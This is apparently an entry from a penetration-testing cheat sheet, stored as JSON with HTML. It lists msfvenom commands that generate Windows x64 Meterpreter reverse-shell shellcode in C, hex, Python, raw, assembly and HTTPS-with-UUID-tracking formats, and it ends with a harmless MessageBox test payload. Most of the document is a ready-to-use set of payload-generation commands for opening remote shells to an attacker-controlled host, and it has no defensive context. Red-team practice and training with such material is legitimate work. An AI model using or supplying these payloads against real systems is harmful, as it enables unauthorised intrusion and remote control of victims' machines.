{"title": "Windows — Shellcode & Staged Payloads", "source": "msfvenom", "source_label": "msfvenom", "path": "payloads/windows-shellcode", "html": "<h1 id=\"windows-shellcode-staged-payloads\">Windows — Shellcode &amp; Staged Payloads</h1>\n<h2 id=\"shellcode-in-c-format\">Shellcode in C format</h2>\n<div class=\"highlight\"><pre><span></span><code>msfvenom<span class=\"w\"> </span>-p<span class=\"w\"> </span>windows/x64/meterpreter/reverse_tcp<span class=\"w\"> </span><span class=\"nv\">LHOST</span><span class=\"o\">=</span>&lt;ip&gt;<span class=\"w\"> </span><span class=\"nv\">LPORT</span><span class=\"o\">=</span>&lt;port&gt;<span class=\"w\"> </span>-f<span class=\"w\"> </span>c\n</code></pre></div>\n<h2 id=\"shellcode-in-hex-format\">Shellcode in hex format</h2>\n<div class=\"highlight\"><pre><span></span><code>msfvenom<span class=\"w\"> </span>-p<span class=\"w\"> </span>windows/x64/meterpreter/reverse_tcp<span class=\"w\"> </span><span class=\"nv\">LHOST</span><span class=\"o\">=</span>&lt;ip&gt;<span class=\"w\"> </span><span class=\"nv\">LPORT</span><span class=\"o\">=</span>&lt;port&gt;<span class=\"w\"> </span>-f<span class=\"w\"> </span>hex\n</code></pre></div>\n<h2 id=\"shellcode-in-python-format\">Shellcode in Python format</h2>\n<div class=\"highlight\"><pre><span></span><code>msfvenom<span class=\"w\"> </span>-p<span class=\"w\"> </span>windows/x64/meterpreter/reverse_tcp<span class=\"w\"> </span><span class=\"nv\">LHOST</span><span class=\"o\">=</span>&lt;ip&gt;<span class=\"w\"> </span><span class=\"nv\">LPORT</span><span class=\"o\">=</span>&lt;port&gt;<span class=\"w\"> </span>-f<span class=\"w\"> </span>python\n</code></pre></div>\n<h2 id=\"shellcode-in-raw-binary\">Shellcode in raw binary</h2>\n<div class=\"highlight\"><pre><span></span><code>msfvenom<span class=\"w\"> </span>-p<span class=\"w\"> </span>windows/x64/meterpreter/reverse_tcp<span class=\"w\"> </span><span class=\"nv\">LHOST</span><span class=\"o\">=</span>&lt;ip&gt;<span class=\"w\"> </span><span class=\"nv\">LPORT</span><span class=\"o\">=</span>&lt;port&gt;<span class=\"w\"> </span>-f<span class=\"w\"> </span>raw<span class=\"w\"> </span>&gt;<span class=\"w\"> </span>payload.bin\n</code></pre></div>\n<h2 id=\"hex-uuid-tracking-https-ssl-cert\">Hex + UUID tracking (HTTPS, SSL cert)</h2>\n<div class=\"highlight\"><pre><span></span><code>msfvenom<span class=\"w\"> </span>-p<span class=\"w\"> </span>windows/x64/meterpreter_reverse_https<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span><span class=\"nv\">lhost</span><span class=\"o\">=</span>&lt;ip&gt;<span class=\"w\"> </span><span class=\"nv\">lport</span><span class=\"o\">=</span><span class=\"m\">443</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span><span class=\"nv\">PayloadUUIDTracking</span><span class=\"o\">=</span><span class=\"nb\">true</span><span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span><span class=\"nv\">HandlerSSLCert</span><span class=\"o\">=</span>ssl.pem<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span><span class=\"nv\">PayloadUUIDName</span><span class=\"o\">=</span>&lt;name&gt;<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>-f<span class=\"w\"> </span>hex<span class=\"w\"> </span>-o<span class=\"w\"> </span>shellcode.hex\n</code></pre></div>\n<h2 id=\"assembly-format-for-manual-injection\">Assembly format (for manual injection)</h2>\n<div class=\"highlight\"><pre><span></span><code>msfvenom<span class=\"w\"> </span>-p<span class=\"w\"> </span>windows/x64/meterpreter/reverse_tcp<span class=\"w\"> </span><span class=\"nv\">LHOST</span><span class=\"o\">=</span>&lt;ip&gt;<span class=\"w\"> </span><span class=\"nv\">LPORT</span><span class=\"o\">=</span>&lt;port&gt;<span class=\"w\"> </span>-f<span class=\"w\"> </span>asm\n</code></pre></div>\n<h2 id=\"messagebox-test-verifies-exec-without-network\">MessageBox test (verifies exec without network)</h2>\n<div class=\"highlight\"><pre><span></span><code>msfvenom<span class=\"w\"> </span>-p<span class=\"w\"> </span>windows/messagebox<span class=\"w\"> </span><span class=\"nv\">TEXT</span><span class=\"o\">=</span><span class=\"s2\">&quot;pwned&quot;</span><span class=\"w\"> </span><span class=\"nv\">TITLE</span><span class=\"o\">=</span><span class=\"s2\">&quot;test&quot;</span><span class=\"w\"> </span>-f<span class=\"w\"> </span>c\n</code></pre></div>", "excerpt": "Windows — Shellcode &amp; Staged Payloads Shellcode in C format msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST = &lt;ip&gt; LPORT = &lt;port&gt; -f c Shellcode in hex format msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST = &lt;ip&gt;…", "tags": []}